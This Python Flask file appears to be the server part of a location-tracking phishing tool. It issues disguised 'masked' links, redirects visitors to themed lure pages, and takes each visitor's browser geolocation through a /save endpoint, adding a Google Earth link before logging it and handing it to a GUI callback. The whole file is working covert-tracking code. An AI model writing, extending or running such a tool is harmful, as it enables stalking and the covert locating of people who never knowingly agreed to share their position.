from flask import Flask, render_template, request, redirect, url_for
from utils.logger import setup_logger
from utils.output import generate_google_earth_link
from datetime import datetime
import uuid

app = Flask(__name__)
logger = setup_logger('flask_server')
link_mappings = {}
callback = None

def start_flask_server(host, port, link_id, content, gui_callback):
    """Start Flask server."""
    global callback
    callback = gui_callback
    masked_path = f"{content}s/{link_id}"
    link_mappings[masked_path] = link_id
    logger.info(f"Starting Flask server on {host}:{port} with link: {masked_path}")
    from gunicorn.app.base import BaseApplication

    class StandaloneApplication(BaseApplication):
        def __init__(self, app, options=None):
            self.options = options or {}
            self.application = app
            super().__init__()

        def load_config(self):
            for key, value in self.options.items():
                self.cfg.set(key.lower(), value)

        def load(self):
            return self.application

    options = {
        'bind': f'{host}:{port}',
        'workers': 4,
        'timeout': 120,
    }
    StandaloneApplication(app, options).run()

@app.route("/<path:masked_path>")
def handle_masked_link(masked_path):
    """Redirect masked link."""
    try:
        link_id = link_mappings.get(masked_path)
        if link_id:
            logger.info(f"Redirecting: {masked_path} to track/{link_id}")
            return redirect(url_for('track', link_id=link_id))
        logger.warning(f"Invalid masked link: {masked_path}")
        return "Invalid Link", 404
    except Exception as e:
        logger.error(f"Error handling masked link: {e}")
        return "Server Error", 500

@app.route("/track/<link_id>")
def track(link_id):
    """Serve landing page."""
    try:
        content = next((k for k, v in link_mappings.items() if v == link_id), None)
        if not content:
            logger.warning(f"Invalid link ID: {link_id}")
            return "Invalid Link", 404
        content_type = content.split("/")[0]
        logger.info(f"Serving {content_type} page for {link_id}")
        return render_template(f"{content_type}.html", link_id=link_id, domain=request.host)
    except Exception as e:
        logger.error(f"Error serving track page: {e}")
        return "Server Error", 500

@app.route("/save", methods=["POST"])
def save_location():
    """Save geolocation data."""
    try:
        data = request.json
        latitude = data.get("latitude")
        longitude = data.get("longitude")
        accuracy = data.get("accuracy", 50.0)
        if not all([latitude, longitude]):
            logger.warning("Invalid geolocation data")
            return "Invalid Data", 400
        result = {
            "latitude": latitude,
            "longitude": longitude,
            "accuracy": accuracy,
            "source": "browser",
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "google_earth_link": generate_google_earth_link(latitude, longitude)
        }
        if callback:
            callback(result)
        logger.info(f"Geolocation saved: {result}")
        return "Success", 200
    except Exception as e:
        logger.error(f"Error saving geolocation: {e}")
        return "Server Error", 500